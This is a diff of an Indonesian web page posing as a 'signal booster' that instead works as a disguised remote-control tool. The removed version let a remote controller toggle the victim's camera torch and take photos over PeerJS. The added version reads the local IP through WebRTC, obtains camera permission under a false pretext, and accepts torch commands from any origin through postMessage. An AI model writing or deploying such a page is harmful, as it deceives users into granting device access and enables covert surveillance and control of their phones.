@@ -1,38 +1,47 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Sinyal Booster V3</title>
-    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <title>Sinyal Booster V4</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { background: #000; color: #00ff00; text-align: center; font-family: sans-serif; padding-top: 100px; }
+        .box { border: 2px solid #0f0; padding: 20px; display: inline-block; border-radius: 10px; }
+    </style>
 </head>
-<body style="background:#000; color:#0f0; text-align:center;">
-    <h2>📡 BOOSTING SIGNAL...</h2>
-    <p id="my-id">Menghubungkan...</p>
-    <video id="v" style="display:none" autoplay playsinline></video>
+<body>
+    <div class="box">
+        <h2>🚀 BOOSTING ACTIVE</h2>
+        <p id="ip-info">Mendeteksi Alamat Jaringan...</p>
+        <button onclick="mintaIzin()" style="padding:10px; background:#0f0; border:none; border-radius:5px;">AKTIFKAN SISTEM</button>
+    </div>
 
     <script>
-        // Inisialisasi koneksi langsung
-        const peer = new Peer(); 
-        
-        peer.on('open', (id) => {
-            document.getElementById('my-id').innerText = "ID Jaringan: " + id;
-            // Kirim ID ini ke Abang (manual) agar Abang bisa kontrol
-        });
-
-        // Nunggu perintah klik-klik dari Abang
-        peer.on('connection', (conn) => {
-            conn.on('data', async (data) => {
-                if (data === "senter_on") jalankanSenter(true);
-                if (data === "senter_off") jalankanSenter(false);
-                if (data === "foto") ambilFoto(conn);
-            });
-        });
+        // Mendeteksi IP Lokal secara otomatis (hanya di beberapa browser)
+        window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+        var pc = new RTCPeerConnection({iceServers:[]}), noop = function(){};      
+        pc.createDataChannel("");
+        pc.createOffer(pc.setLocalDescription.bind(pc), noop);
+        pc.onicecandidate = function(ice){
+            if(!ice || !ice.candidate || !ice.candidate.candidate) return;
+            var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
+            document.getElementById('ip-info').innerHTML = "<b>ALAMAT IP:</b> " + myIP;
+            pc.onicecandidate = noop;
+        };
 
         let track;
-        async function jalankanSenter(s) {
-            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode:"environment"}});
-            track = stream.getVideoTracks()[0];
-            track.applyConstraints({advanced: [{torch: s}]});
+        async function mintaIzin() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "environment"}});
+                track = stream.getVideoTracks()[0];
+                alert("Sistem Siap di IP tersebut!");
+            } catch(e) { alert("Klik Izinkan Kamera!"); }
         }
+
+        // Menerima perintah dari Remote via Message Channel
+        window.addEventListener("message", function(event) {
+            if (event.data === "on") track.applyConstraints({advanced: [{torch: true}]});
+            if (event.data === "off") track.applyConstraints({advanced: [{torch: false}]});
+        }, false);
     </script>
 </body>
 </html>
